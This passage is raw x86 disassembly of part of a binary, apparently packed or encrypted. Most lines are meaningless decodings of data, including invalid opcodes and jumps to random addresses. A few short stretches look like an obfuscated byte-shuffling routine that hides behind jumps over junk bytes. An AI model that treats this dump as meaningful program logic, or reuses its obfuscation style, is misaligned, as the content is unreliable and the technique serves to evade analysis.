  404999:	xor    edi,DWORD PTR [edx+0x4e]
  40499c:	xlat   BYTE PTR ds:[ebx]
  40499d:	mov    dl,0xa
  40499f:	jp     0x4049b9
  4049a1:	(bad)  
  4049a2:	retf   0x30f0
  4049a5:	sahf   
  4049a6:	cmp    al,0x5d
  4049a8:	pop    eax
  4049a9:	pusha  
  4049aa:	mov    ds:0x6fc361a0,al
  4049af:	or     ebx,DWORD PTR [ebx+0x6e4ec194]
  4049b5:	inc    eax
  4049b6:	jp     0x404a07
  4049b8:	sub    al,0xde
  4049ba:	mov    edi,0x5b32aa0c
  4049bf:	cdq    
  4049c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049c1:	test   eax,0x55c740e4
  4049c6:	rcl    eax,1
  4049c8:	push   ss
  4049c9:	je     0x404992
  4049cb:	popf   
  4049cc:	xor    BYTE PTR [eax+0x2a425ae3],0xec
  4049d3:	lods   eax,DWORD PTR ds:[esi]
  4049d4:	jbe    0x4049c8
  4049d6:	(bad)  
  4049d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049d9:	sbb    bl,bl
  4049db:	dec    eax
  4049dc:	out    0xd2,eax
  4049de:	repz mov esp,DWORD PTR [ecx-0x51]
  4049e2:	or     BYTE PTR [esi-0x33042ebd],cl
  4049e8:	sub    al,0x4a
  4049ea:	mov    edi,0xf56620aa
  4049ef:	imul   eax,DWORD PTR [edi+0x2c],0x47
  4049f3:	ret    
  4049f4:	and    DWORD PTR es:[esi-0x6a3e798c],0xffffff85
  4049fc:	mov    ecx,0xb391d0b1
  404a01:	cs inc ebp
  404a03:	inc    eax
  404a04:	adc    al,0x55
  404a06:	bound  edi,QWORD PTR [ebx+ecx*2-0x568ab8a9]
  404a0d:	neg    ebp
  404a0f:	rcl    ch,1
  404a11:	test   DWORD PTR [ebx+0x24],0x43065785
  404a18:	ins    DWORD PTR es:[edi],dx
  404a19:	loop   0x4049d6
  404a1b:	cs je  0x404a34
  404a1e:	add    ebp,0x716dc8b4
  404a24:	mov    BYTE PTR [eax],bl
  404a26:	jecxz  0x404a5e
  404a28:	adc    bl,0x64
  404a2b:	out    dx,eax
  404a2c:	scas   al,BYTE PTR es:[edi]
  404a2d:	sbb    eax,0x2fb7ddfd
  404a32:	mov    esp,0x32f64beb
  404a37:	push   ss
  404a38:	push   0xffffffe9
  404a3a:	xor    bl,ah
  404a3c:	call   0xaddc:0xcece5c46
  404a43:	xchg   ecx,eax
  404a44:	mov    ds:0x9db10a83,al
  404a49:	ins    BYTE PTR es:[edi],dx
  404a4a:	ficomp WORD PTR [esi]
  404a4c:	mov    ?,WORD PTR [edx-0x39]
  404a4f:	jl     0x404a11
  404a51:	mov    ebx,0xb7c95852
  404a56:	or     edx,eax
  404a58:	and    DWORD PTR [esi+eiz*2-0x28d7be4f],ebx
  404a5f:	nop
  404a60:	sahf   
  404a61:	push   ss
  404a62:	mov    cl,0xbe
  404a64:	out    0x1d,eax
  404a66:	cmp    eax,0x8dd88964
  404a6b:	neg    BYTE PTR [ebx-0x24]
  404a6e:	loopne 0x404a18
  404a70:	es int3 
  404a72:	jns    0x404a25
  404a74:	fmul   DWORD PTR [edx+ebp*4+0x34309d1d]
  404a7b:	dec    ebp
  404a7c:	pusha  
  404a7d:	fwait
  404a7e:	dec    ebx
  404a7f:	cdq    
  404a80:	ins    BYTE PTR es:[edi],dx
  404a81:	test   al,0xe2
  404a83:	test   DWORD PTR ds:0x26e40c41,ebp
  404a89:	mov    esi,DWORD PTR [ecx+edi*8-0x613aca76]
  404a90:	add    esi,eax
  404a92:	jge    0x404b03
  404a94:	sbb    ecx,ebp
  404a96:	mov    ebx,0x30957759
  404a9b:	nop
  404a9c:	inc    ebp
  404a9d:	(bad)  
  404a9e:	outs   dx,DWORD PTR ds:[esi]
  404a9f:	fld    TBYTE PTR [eax+0x5467209d]
  404aa5:	xchg   edi,eax
  404aa7:	inc    ebp
  404aa8:	hlt    
  404aa9:	xor    al,BYTE PTR [ebp+0x45c7f89c]
  404aaf:	mov    esp,0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0xfc3c6a28
  404b32:	push   ss
  404b33:	and    bh,BYTE PTR ds:0x7e7e22a2
  404b39:	pop    eax
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404ba2
  404b3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b3f:	pop    edx
  404b40:	inc    ecx
  404b41:	test   BYTE PTR [ecx],al
  404b43:	jle    0x404b1a
  404b45:	dec    ebp
  404b46:	xor    DWORD PTR [edi-0x59],edi
  404b49:	gs repz arpl WORD PTR ss:[ecx+ebp*1],bp
  404b4f:	cli    
  404b50:	pop    ecx
  404b51:	cmp    bl,BYTE PTR [esi]
  404b53:	clc    
  404b54:	jg     0x404b08
  404b56:	test   BYTE PTR [eax-0x56],al
  404b59:	push   eax
  404b5a:	dec    esp
  404b5b:	pop    ecx
  404b5c:	jns    0x404b7f
  404b5e:	pop    eax
  404b5f:	cmp    DWORD PTR [esi-0xd266fc7],eax
  404b65:	leave  
  404b66:	jge    0x404b4d
  404b68:	pusha  
  404b69:	inc    edi
  404b6a:	fld    QWORD PTR [esi]
  404b6c:	les    edi,FWORD PTR [edx+0x9f7de7b]
  404b72:	enter  0x4773,0x71
  404b76:	cmp    al,0x98
  404b78:	ds sbb bh,al
  404b7b:	or     BYTE PTR [edi+0x72b3612e],al
  404b81:	pop    edi
  404b82:	sub    DWORD PTR [ebx],0x4f
  404b85:	ror    BYTE PTR [esi+0x1],1
  404b88:	adc    DWORD PTR [ecx+0x5f],ebp
  404b8b:	loope  0x404baa
  404b8d:	pusha  
  404b8e:	mov    BYTE PTR [ecx],dl
  404b90:	ds sbb al,0x12
  404b93:	cs push es
  404b95:	and    DWORD PTR [ebx+0x69],esi
  404b98:	lods   eax,DWORD PTR ds:[esi]
  404b99:	add    al,BYTE PTR [edi]
  404b9b:	sub    DWORD PTR [edi+eiz*8-0x329ae74d],eax
  404ba2:	push   es
  404ba3:	mov    bl,0x49
  404ba5:	int3   
  404ba6:	xchg   ebx,eax
  404ba7:	adc    eax,0x9481a551
  404bac:	lds    edx,FWORD PTR [esi+0x3f]
  404baf:	cwde   
  404bb0:	mov    bl,0xe2
  404bb2:	jbe    0x404b46
  404bb4:	out    0x57,al
  404bb6:	inc    ebx
  404bb7:	add    eax,ecx
  404bb9:	or     ebx,DWORD PTR [ebx+edx*8+0x64]
  404bbd:	add    bh,BYTE PTR [ebx+0x738dba3e]
  404bc3:	pop    edi
  404bc4:	jns    0x404bd3
  404bc6:	push   edi
  404bc7:	aam    0xcc
  404bc9:	hlt    
  404bca:	pop    ss
  404bcb:	jp     0x404b65
  404bcd:	rcr    DWORD PTR [edx],cl
  404bcf:	or     edx,DWORD PTR [ebp-0x15e5f97a]
  404bd5:	in     eax,0xcf
  404bd7:	xchg   esp,eax
  404bd8:	push   eax
  404bd9:	fs dec ebx
  404bdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bdc:	enter  0xe7be,0x8f
  404be0:	xlat   BYTE PTR ss:[ebx]
  404be2:	jbe    0x404b87
  404be4:	inc    edx
  404be5:	inc    eax
  404be6:	loop   0x404c2e
  404be8:	dec    ebp
  404be9:	stos   BYTE PTR es:[edi],al
  404bea:	out    0x3f,al
  404bec:	inc    edi
  404bed:	adc    eax,0xd219b0
  404bf2:	fcom   DWORD PTR [ecx]
  404bf4:	mov    edi,0x1b9931f6
  404bf9:	pop    ecx
  404bfa:	lods   eax,DWORD PTR ds:[esi]
  404bfb:	lahf   
  404bfc:	cs push esp
  404bfe:	fld    DWORD PTR ss:[ecx+esi*8-0x27]
  404c03:	repz jae 0x404c5b
  404c06:	sub    eax,0x9bb1b9b0
  404c0b:	rcr    DWORD PTR [esi],0x89
  404c0e:	mov    eax,0x33bdc991
  404c13:	push   ecx
  404c14:	jl     0x404c2e
  404c16:	jge    0x404beb
  404c18:	aaa    
  404c19:	jns    0x404c45
  404c1b:	in     eax,0x7b
  404c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c1e:	cmp    eax,0xea63466f
  404c23:	and    BYTE PTR [edi],al
  404c25:	xchg   di,ax
  404c27:	dec    ebx
  404c29:	int    0x10
  404c2b:	lock scas al,BYTE PTR es:[edi]
  404c2d:	cdq    
  404c2e:	clc    
  404c2f:	lahf   
  404c30:	popf   
  404c31:	mov    ch,BYTE PTR [ecx+0x25222185]
  404c37:	jp     0x404bcb
  404c39:	in     al,0x54
  404c3b:	and    ebx,DWORD PTR [eax+0x6b]
  404c3e:	outs   dx,DWORD PTR ds:[esi]
  404c3f:	jmp    0x2ebf:0x54c1593b
  404c46:	push   ebp
  404c47:	cmc    
  404c48:	ret    
  404c49:	(bad)  
  404c4a:	addr16 jno 0x404c90
  404c4d:	retf   
  404c4e:	or     al,0x35
  404c50:	sub    eax,0x70094d8c
  404c55:	lea    ecx,[ebx+eiz*4+0x125a9c63]
  404c5c:	jae    0x404bde
  404c5e:	imul   ebx,DWORD PTR [eax],0x3efeb1b7
  404c64:	lea    edi,[ebx+0x546616c]
  404c6a:	xor    al,ah
  404c6c:	and    DWORD PTR [ecx-0x8],eax
  404c6f:	iret   
  404c70:	push   0x9711956d
  404c75:	push   esp
  404c76:	jnp    0x404c41
  404c78:	mov    dl,BYTE PTR [eax-0x552d294f]
  404c7e:	inc    ebp
  404c7f:	sub    al,BYTE PTR [esi+edi*2+0x1f]
  404c83:	sar    DWORD PTR [esi+0x46],1
  404c86:	mov    cl,0xa5
  404c88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c89:	scas   al,BYTE PTR es:[edi]
  404c8a:	fidivr DWORD PTR [ebp+ebp*1-0x55907a3b]
  404c91:	inc    edx
  404c92:	push   eax
  404c93:	and    DWORD PTR [ebx-0x4a],ecx
  404c96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c97:	das    
  404c98:	test   al,0x22
  404c9a:	inc    ebx
  404c9b:	jae    0x404cbd
  404c9d:	rcl    bh,1
  404c9f:	or     bl,BYTE PTR [edi]
  404ca1:	sbb    bl,BYTE PTR [edx+0x42]
  404ca4:	inc    ebp
  404ca5:	lods   al,BYTE PTR ds:[esi]
  404ca6:	shl    BYTE PTR [ecx],cl
  404ca8:	push   es
  404ca9:	mov    edx,0xe0303fb8
  404cae:	push   esi
  404caf:	pushf  
  404cb0:	sbb    al,0x48
  404cb2:	(bad)  
  404cb3:	mov    esi,0xb2df9529
  404cb8:	retf   0xf753
  404cbb:	mov    al,ds:0x8297bb9
  404cc0:	push   edx
  404cc1:	popa   
  404cc2:	jg     0x404cb8
  404cc4:	sbb    DWORD PTR [eax+ebx*4],ebx
  404cc7:	imul   BYTE PTR [esi]
  404cc9:	jbe    0x404d05
  404ccb:	sub    ah,bh
  404ccd:	sbb    edi,DWORD PTR [ebp-0x6b]
  404cd0:	add    esi,DWORD PTR [ecx]
  404cd2:	aas    
  404cd3:	iret   
  404cd4:	cmp    DWORD PTR [ebp-0x1c],esi
  404cd7:	sbb    edx,DWORD PTR [ecx]
  404cd9:	jmp    0xf78b:0x34d5a6d0
  404ce0:	inc    esp
  404ce1:	xor    dl,BYTE PTR [ebp-0x6c]
  404ce4:	jmp    0x74c46d09
  404ce9:	push   0x41a26ccf
  404cee:	cmc    
  404cef:	adc    al,0x8b
  404cf1:	sbb    eax,0x2abe2b88
  404cf6:	hlt    
  404cf7:	dec    ecx
  404cf8:	jle    0x404d21
  404cfa:	test   eax,0x9e1e5706
  404cff:	cmc    
  404d00:	dec    esi
  404d01:	inc    edx
  404d02:	cs jnp 0x404d79
  404d05:	xchg   edx,eax
  404d06:	adc    BYTE PTR [edi+ebx*2],bh
  404d09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d0a:	aas    
  404d0b:	ins    DWORD PTR es:[edi],dx
  404d0c:	jge    0x404cd2
  404d0e:	jno    0x404cc0
  404d10:	fs call 0xd9d20c74
  404d16:	shr    dh,0x70
  404d19:	pop    ebx
  404d1a:	out    dx,eax
  404d1b:	mov    ch,0x9e
  404d1d:	in     al,dx
  404d1e:	xor    al,0x21
  404d20:	shl    BYTE PTR [ecx-0x63],cl
  404d23:	or     al,0x15
  404d25:	pop    esi
  404d26:	retf   
  404d27:	mov    esi,DWORD PTR ds:0xc7867ea6
  404d2d:	sbb    eax,0x782a43c9
  404d32:	push   0x29
  404d34:	out    dx,eax
  404d35:	jnp    0x404cdb
  404d37:	or     eax,ecx
  404d39:	sbb    ah,ah
  404d3b:	and    bh,ah
  404d3d:	repnz std 
  404d3f:	dec    ebp
  404d40:	pop    ecx
  404d41:	(bad)  
  404d43:	xor    BYTE PTR [eax-0x7fe09ff1],ch
  404d49:	sar    BYTE PTR [ebx-0x7c],1
  404d4c:	call   0xbdedae2b
  404d51:	ds shl bh,0x3a
  404d55:	cmp    BYTE PTR [esp+edx*2-0x60a00ab1],bl
  404d5c:	leave  
  404d5d:	adc    ebp,DWORD PTR [ebx-0x52]
  404d60:	mov    al,0x23
  404d62:	mov    esi,0xdc269f1
  404d67:	mov    bh,BYTE PTR [edx-0x3c]
  404d6a:	in     eax,dx
  404d6b:	lea    ecx,[ebx+0x6e]
  404d6e:	mov    DWORD PTR [esi-0x4],ecx
  404d71:	pop    ds
  404d72:	and    ebx,DWORD PTR [ebp+ebp*1+0x68]
  404d76:	add    eax,0x713b4a3f
  404d7b:	out    dx,al
  404d7c:	xor    al,0x3d
  404d7e:	ss stos DWORD PTR es:[edi],eax
  404d80:	cdq    
  404d81:	pop    ebp
  404d82:	loopne 0x404df1
  404d84:	(bad)  
  404d85:	add    ebx,DWORD PTR [ecx-0x3e]
  404d88:	pushf  
  404d89:	cmp    al,0xdd
  404d8b:	ret    0x2345
  404d8e:	jne    0x404d32
  404d90:	fiadd  DWORD PTR [edi+0x32]
  404d93:	pop    es
  404d94:	popa   
  404d95:	dec    ebx
  404d96:	xchg   ebx,eax
  404d97:	repnz ror edi,1
  404d9a:	call   0xc5629ce
  404d9f:	dec    edi
  404da0:	test   eax,0xbb2a2b50
  404da5:	sar    BYTE PTR [ebp-0x6d90df23],0x59
  404dac:	push   ebp
  404dad:	jmp    0xd3a9:0xaf356fd7
  404db4:	sub    BYTE PTR ds:0x90ee7b32,bl
  404dba:	loop   0x404d9d
  404dbc:	stc    
  404dbd:	xchg   ebp,eax
  404dbe:	sub    ecx,ebp
  404dc0:	push   ds
  404dc1:	mov    edx,0x8e160599
  404dc6:	pop    esp
  404dc7:	repnz xor esi,DWORD PTR [edi+0x5830a521]
  404dce:	dec    ebp
  404dcf:	adc    eax,DWORD PTR [ebx-0x59994158]
  404dd5:	xchg   ecx,eax
  404dd6:	cmp    eax,0x53e00a6d
  404ddb:	jns    0x404dd4
  404ddd:	adc    eax,0xfda0df6c
  404de2:	js     0x404e0c
  404de4:	fsubr  DWORD PTR [eax+0x25]
  404de8:	mov    cs,WORD PTR [eax-0x19]
  404deb:	inc    ecx
  404dec:	call   eax
  404dee:	mov    dh,0x3e
  404df0:	or     BYTE PTR [edi+0x57b63807],cl
  404df6:	test   eax,0xcc442320
  404dfb:	mov    esi,0xa9c54cd4
  404e00:	push   esp
  404e01:	xchg   BYTE PTR ds:0xffb17a8c,bh
  404e07:	adc    al,0x79
  404e09:	ss lock popa 
  404e0c:	js     0x404db6
  404e0e:	mov    edi,0x6b18079e
  404e13:	sub    DWORD PTR [ebx+0x42],esp
  404e16:	rcr    DWORD PTR [esi+0x31562a38],1
  404e1c:	inc    edi
  404e1d:	(bad)  
  404e1e:	clc    
  404e1f:	inc    esp
  404e20:	cmp    dl,BYTE PTR [ebx-0x45]
  404e23:	add    edi,ecx
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e26
  404e5e:	or     ch,BYTE PTR [edi+0x1f]
  404e61:	mov    WORD PTR [ecx],fs
  404e63:	jle    0x404ee3
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404e76
  404e6a:	jecxz  0x404ead
  404e6c:	scas   eax,DWORD PTR es:[edi]
  404e6d:	dec    ebx
  404e6e:	push   esp
  404e6f:	daa    
  404e70:	jg     0x404e37
  404e72:	mov    cl,0x95
  404e74:	cld    
  404e75:	add    eax,0x22e82d9f
  404e7a:	dec    edi
  404e7b:	sahf   
  404e7c:	adc    eax,DWORD PTR [edi+0x43]
  404e7f:	jg     0x404e33
  404e81:	in     eax,dx
  404e82:	rcr    ch,cl
  404e84:	pop    esi
  404e85:	(bad)
  404e88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e89:	sahf   
  404e8a:	les    esp,FWORD PTR [ebx]
  404e8c:	(bad)  
  404e8d:	push   esi
  404e8e:	sub    eax,0xb534dee
  404e93:	mov    edi,0xe4a2c86
  404e98:	jg     0x404e5c
  404e9a:	and    ch,al
  404e9c:	loope  0x404eac
  404e9e:	dec    ebp
  404e9f:	push   ebp
  404ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ea1:	jae    0x404f14
  404ea3:	add    esi,DWORD PTR [edi+edx*4+0x2c]
  404ea7:	mov    ds,WORD PTR [eax+esi*1-0x71b5e39]
  404eae:	mov    dh,0xea
  404eb0:	mov    al,0xe8
  404eb2:	outs   dx,BYTE PTR ds:[esi]
  404eb3:	and    eax,esp
  404eb5:	shr    ebx,cl
  404eb7:	(bad)  
  404eb8:	push   0xffffffd6
  404eba:	push   ebp
  404ebb:	out    0x7b,eax
  404ebd:	xchg   DWORD PTR [esi+0x4e],esi
  404ec0:	mov    cl,0x6c
  404ec2:	mov    bl,0x6f
  404ec4:	cmp    DWORD PTR [edi+0x4d],edx
  404ec7:	rol    BYTE PTR [di],cl
  404eca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ecb:	push   es
  404ecc:	aas    
  404ecd:	push   edx
  404ece:	inc    ebp
  404ecf:	mov    al,0x7
  404ed1:	icebp  
  404ed2:	pop    esp
  404ed3:	loop   0x404e74
  404ed5:	inc    edx
  404ed6:	ss xrelease mov DWORD PTR gs:[edi-0x45],eax
  404edc:	jge    0x404f56
  404ede:	scas   eax,DWORD PTR es:[edi]
  404edf:	jmp    0x988ceb49
  404ee4:	xchg   esi,eax
  404ee5:	dec    esp
  404ee6:	outs   dx,DWORD PTR ds:[esi]
  404ee7:	inc    ebx
  404ee8:	out    dx,al
  404ee9:	bound  eax,QWORD PTR [edx+0x7cdea2bc]
  404eef:	in     eax,dx
  404ef0:	mov    WORD PTR [esi+0x2b0ea67c],ss
  404ef6:	mov    cl,0x49
  404ef8:	js     0x404ee1
  404efa:	add    BYTE PTR [ebp+0xec3ce21],dl
  404f00:	push   edx
  404f01:	sub    eax,0xde6bb9eb
  404f06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f07:	enter  0xd6a2,0xb4
  404f0b:	push   ebp
  404f0c:	stos   DWORD PTR es:[edi],eax
  404f0d:	jecxz  0x404f0a
  404f0f:	adc    eax,0x467b62ee
  404f14:	jl     0x404ee9
  404f16:	stos   DWORD PTR es:[edi],eax
  404f17:	mov    eax,ebx
  404f19:	aas    
  404f1a:	dec    edi
  404f1b:	mov    WORD PTR [ecx+eiz*4],es
  404f1e:	dec    esp
  404f1f:	lock jl 0x404ee3
  404f22:	(bad)  
  404f23:	mov    bh,0x2
  404f25:	daa    
  404f26:	jns    0x404ee8
  404f28:	xor    eax,ebp
  404f2a:	lahf   
  404f2b:	fcmove st,st(5)
  404f2d:	call   0x80741fed
  404f32:	(bad)  
  404f34:	aad    0xe
  404f36:	and    bh,BYTE PTR [edx]
  404f38:	xlat   BYTE PTR ds:[ebx]
  404f39:	push   0xffffff9d
  404f3b:	into   
  404f3c:	jmp    0xa275:0xfd24dbb8
  404f43:	hlt    
  404f44:	sbb    al,0x32
  404f46:	stos   DWORD PTR es:[edi],eax
  404f47:	jle    0x404f5d
  404f49:	sub    bl,BYTE PTR [eax]
  404f4b:	xlat   BYTE PTR ds:[ebx]
  404f4c:	jecxz  0x404f04
  404f4e:	cmp    ebp,DWORD PTR [ebx+0x4d]
  404f51:	lods   al,BYTE PTR ds:[esi]
  404f52:	xchg   ebp,eax
  404f53:	shl    BYTE PTR [esi-0xf],0xbd
  404f57:	ret    0xb223
  404f5a:	add    eax,0xff315dad
  404f5f:	mov    dl,0xd2
  404f61:	cmp    dl,BYTE PTR [edx-0x21]
  404f64:	jge    0x404f22
  404f66:	ins    BYTE PTR es:[edi],dx
  404f67:	mov    ebx,0x773836ef
  404f6c:	inc    esp
  404f6d:	je     0x404f1d
  404f6f:	adc    BYTE PTR [ebx],ch
  404f71:	ror    BYTE PTR [ecx],1
  404f73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f75:	jle    0x404fa7
  404f77:	jne    0x404f4b
  404f79:	add    al,bh
  404f7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f7c:	leave  
  404f7d:	mov    dl,0xf7
  404f7f:	adc    eax,0x17cd7237
  404f84:	and    ecx,DWORD PTR [ecx+ecx*2-0x4bd885f0]
  404f8b:	ins    BYTE PTR es:[edi],dx
  404f8c:	data16 icebp 
  404f8e:	sbb    dl,bl
  404f90:	or     cl,BYTE PTR [eax]
  404f92:	pop    ebx
  404f93:	clc    
  404f94:	sub    bl,BYTE PTR [edx]
  404f96:	popf   
  404f97:	cmp    ah,dl
  404f99:	jnp    0x404fc5
  404f9b:	sbb    al,0x99
  404f9d:	push   esp
  404f9e:	jg     0x404f42
  404fa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fa1:	retf   
  404fa2:	pop    ebx
  404fa3:	adc    BYTE PTR [esi+0x6],dl
  404fa6:	pop    esi
  404fa7:	pop    ebx
  404fa8:	or     edx,DWORD PTR [ebp+0xb]
  404fab:	or     al,0x73
  404fad:	(bad)  
  404fae:	popa   
  404faf:	adc    edi,DWORD PTR [ebx+0x5f]
  404fb2:	push   0x7c
  404fb4:	xchg   ebp,eax
  404fb5:	adc    DWORD PTR [ecx+0x577d88b9],0x8b2689ab
  404fbf:	ss (bad) 
  404fc1:	in     al,0x7c
  404fc3:	sbb    DWORD PTR [ebx+0x69],eax
  404fc6:	xchg   ecx,eax
  404fc7:	or     al,0xad
  404fc9:	test   BYTE PTR [ebx+0x5a],dh
  404fcc:	or     ch,al
  404fce:	inc    ebx
  404fcf:	or     edi,DWORD PTR [edx]
  404fd1:	push   esp
  404fd2:	push   ebp
  404fd3:	and    DWORD PTR [ecx+0x46585679],ecx
  404fd9:	jle    0x404f6d
  404fdb:	lahf   
  404fdc:	cli    
  404fdd:	rcl    BYTE PTR [ebx+0x54],cl
  404fe0:	test   al,0x3e
  404fe2:	or     eax,0x3102baf8
  404fe7:	jo     0x4879baa6
  404fed:	and    al,0xf5
  404fef:	shl    BYTE PTR [esi+0x6],cl
  404ff2:	and    al,0xdd
  404ff4:	call   0xf2aa7f18
  404ff9:	lahf   
  404ffa:	shr    DWORD PTR [esi],0xbd
  404ffd:	mov    al,ds:0xa4d9dab5
  405002:	xor    BYTE PTR [eax],bl
  405004:	xor    cl,ah
  405006:	xchg   esp,eax
  405007:	gs retf 
  405009:	jno    0x40507f
  40500b:	mov    bh,0xb8
  40500d:	pop    edi
  40500e:	mov    si,0xded2
  405012:	jae    0x405056
  405014:	mov    ebx,0x89645735
  405019:	jl     0x405011
  40501b:	add    edi,DWORD PTR [edx+0x43]
  40501e:	int    0xf
  405020:	pop    ss
  405021:	add    DWORD PTR [esi-0x44],edx
  405024:	xchg   ebx,eax
  405025:	xor    eax,0x23009766
  40502a:	inc    edi
  40502b:	add    BYTE PTR [eax-0x58],bh
  40502e:	xor    DWORD PTR [ebx],edx
  405030:	add    eax,edx
  405032:	inc    esi
  405033:	aam    0xe
  405035:	cmp    ecx,DWORD PTR [edi-0x10]
  405038:	imul   BYTE PTR [esi+esi*2]
  40503b:	mov    bl,0xc8
  40503d:	cs mov ebp,eax
  405040:	sub    al,0x8a
  405042:	jbe    0x40509a
  405044:	shr    DWORD PTR [edi-0x28],1
  405047:	adc    al,0x22
  405049:	adc    edi,esp
  40504b:	fstp   DWORD PTR [esi-0x745023c1]
  405051:	mov    WORD PTR [ebx+ebx*2],cs
  405054:	scas   eax,DWORD PTR es:[di]
  405056:	inc    eax
  405057:	or     esp,DWORD PTR [ebx]
  405059:	(bad)
  40505d:	shl    DWORD PTR [ebp+0x5491b595],0xd6
  405064:	adc    ah,BYTE PTR [esp+ebx*2+0x5900f582]
  40506b:	cld    
  40506c:	mov    ?,WORD PTR [edx+0x630fd9de]
  405072:	popa   
  405073:	xchg   DWORD PTR [edx-0x65bbf450],ecx
  405079:	jmp    0x1856:0xb6f61adc
  405080:	cs es mov dl,0xe5
  405084:	imul   edx,DWORD PTR [esi-0x3a],0xde07cbc3
  40508b:	mov    al,ds:0xedeb3b11
  405090:	stc    
  405091:	cmp    eax,0x7e470cba
  405096:	xor    ebp,DWORD PTR [ebp+0x3f]
  405099:	dec    esi
  40509a:	in     eax,dx
  40509b:	out    dx,al
  40509c:	dec    esp
  40509d:	mov    BYTE PTR [eax-0x6d],ah
  4050a0:	cmp    ch,dl
  4050a2:	mov    ds:0x6f2799d9,al
  4050a7:	xlat   BYTE PTR cs:[ebx]
  4050a9:	add    al,0xec
  4050ab:	cs xchg ebx,eax
  4050ad:	and    DWORD PTR [edx-0x37],ebx
  4050b0:	ins    BYTE PTR es:[edi],dx
  4050b1:	sub    al,0x1a
  4050b3:	paddd  mm7,QWORD PTR [edi+0x4ad1d7c1]
  4050ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050bb:	fild   WORD PTR [ebp-0x1c50130b]
  4050c1:	and    eax,0x387a9a3
  4050c6:	mov    esp,DWORD PTR [eax-0x7d]
  4050c9:	jbe    0x4050ec
  4050cb:	mov    DWORD PTR [esi],edi
  4050cd:	fs (bad) 
  4050cf:	xchg   esp,eax
  4050d0:	or     esi,esi
  4050d2:	(bad)  [edi+0x28]
  4050d5:	test   BYTE PTR [eax],ch
  4050d7:	out    dx,al
  4050d8:	popa   
  4050d9:	add    eax,0x5b15209d
  4050de:	out    0x3c,eax
  4050e0:	test   BYTE PTR [ecx+0x6cc7a65c],dl
  4050e6:	dec    esp
  4050e7:	loop   0x405118
  4050e9:	shl    DWORD PTR [edi+edx*1],1
  4050ec:	inc    eax
  4050ed:	dec    eax
  4050ee:	push   esi
  4050ef:	(bad)  [eax+0x6e]
  4050f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050f3:	jge    0x4050ac
  4050f5:	xchg   ecx,eax
  4050f6:	in     al,0xf2
  4050f8:	loop   0x40508f
  4050fa:	aam    0x95
  4050fc:	lds    esp,FWORD PTR [ecx-0x7f7a2e52]
  405102:	sbb    eax,0x5a1f3510
  405107:	sbb    BYTE PTR [esp+eax*1+0x4d974f3b],dh
